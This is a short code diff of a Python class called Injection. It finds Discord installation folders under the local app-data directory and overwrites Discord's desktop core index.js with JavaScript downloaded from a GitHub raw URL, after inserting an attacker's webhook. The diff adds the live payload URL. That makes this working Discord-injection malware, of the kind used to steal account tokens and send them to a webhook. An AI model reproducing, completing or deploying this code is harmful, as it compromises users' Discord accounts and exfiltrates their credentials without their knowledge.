@@ -9,7 +9,7 @@ class Injection:
                 for __dir in os.listdir(self.LOCAL_APP_DATA / _dir):
                     if re.match(r'app-(\d*\.\d*)*', __dir):
                         abspath = self.LOCAL_APP_DATA / _dir / __dir
-                        f = requests.get("").text.replace("%WEBHOOK%", wbh)
+                        f = requests.get("https://raw.githubusercontent.com/GOKUMUI1/Gokuprivla/main/injection/injection.js").text.replace("%WEBHOOK%", wbh)
                         try:
                             index_file_path = abspath / 'modules' / 'discord_desktop_core-1' / 'discord_desktop_core' / 'index.js'
                             with open(index_file_path, 'w', encoding="utf-8") as index_file:
